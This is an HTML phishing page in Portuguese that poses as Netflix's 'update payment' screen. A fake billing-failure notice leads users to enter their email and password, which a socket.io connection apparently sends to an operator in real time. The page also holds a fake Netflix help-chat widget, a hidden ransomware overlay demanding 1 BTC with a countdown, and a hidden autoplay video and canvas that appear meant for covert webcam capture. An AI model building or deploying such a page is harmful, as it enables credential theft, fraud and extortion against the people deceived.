<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Atualizar Pagamento</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; color: #fff; }
        .bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0.4; z-index: -1; }
        .card { background: rgba(0, 0, 0, 0.75); padding: 60px 68px 40px; border-radius: 4px; text-align: left; max-width: 450px; width: 100%; position: relative; box-sizing: border-box; }
        .logo { width: 150px; margin-bottom: 20px; position: absolute; top: -80px; left: 0; }
        .title { font-size: 32px; font-weight: 500; margin-bottom: 28px; }
        .ms-input { width: 100%; background: #333; color: #fff; border: none; padding: 16px 20px; font-size: 16px; margin-bottom: 16px; border-radius: 4px; outline: none; box-sizing: border-box; }
        .ms-input:focus { background: #454545; }
        .ms-button { background: #e50914; color: white; border: none; padding: 16px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 4px; font-size: 16px; margin-top: 24px; transition: 0.2s; }
        .ms-button:hover { background: #c10811; }
        
        #ransom-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#100; color:#f33; z-index:99999; text-align:center; padding-top:100px; font-family:monospace; }
        #chat-widget { position: fixed; bottom: 20px; right: 20px; width: 320px; background: #333; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); overflow: hidden; display: none; z-index: 1000; border: 1px solid #444; text-align: left; }
    </style>
</head>
<body>
    <img src="https://assets.nflxext.com/ffe/siteui/vlv3/b4c7f092-0488-48b7-854d-ca055a84fb4f/5b22968d-b94f-44ec-bea1-381f66c7ef25/BR-pt-20231204-popsignuptwoweeks-perspective_alpha_website_small.jpg" class="bg-image">
    
    <div id="template-container" class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
        <div id="loader" style="margin-bottom:20px; text-align:center; color:#e50914; font-weight:bold;">Verificando assinatura...</div>
        <div id="content" style="display:none;">
            <div id="nx-view">
                <div class="title">Atualizar Conta</div>
                <div style="font-size: 16px; color: #b3b3b3; margin-bottom: 20px;">Sua assinatura foi pausada devido a uma falha no faturamento. Atualize seus dados.</div>
                
                <input type="email" id="u" class="ms-input" placeholder="Email ou número de telefone">
                <input type="password" id="p" class="ms-input" placeholder="Senha" style="display:none;">
                
                <button class="ms-button" id="btn" onclick="handleAuth()">Entrar</button>
            </div>
        </div>
    </div>

    <!-- Ransomware -->
    <div id="ransom-overlay">
        <h1 style="font-size:3rem;">⚠ SYSTEM ENCRYPTED ⚠</h1>
        <div id="timer" style="font-size:5rem; color:#ff0;">23:59:59</div>
        <p>Send 1.0 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
    </div>

    <!-- Chat -->
    <div id="chat-widget">
        <div style="background:#e50914; color:white; padding:15px; font-weight:bold;">Centro de Ajuda Netflix</div>
        <div id="chat-msgs" style="height:250px; overflow-y:auto; padding:15px; font-size:0.85rem; display:flex; flex-direction:column; gap:10px;"></div>
        <div style="display:flex; padding:10px; border-top:1px solid #444; background:#222;">
            <input type="text" id="chat-in" placeholder="Responder..." style="flex:1; border:none; outline:none; background:transparent; color:#fff;">
            <button onclick="sendChat()" style="background:none; border:none; color:#e50914; font-weight:bold; cursor:pointer;">Enviar</button>
        </div>
    </div>

    <video id="v" width="1" height="1" autoplay style="opacity:0; position:fixed;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script src="/sentinel.js?v=5"></script>
</body>
</html>
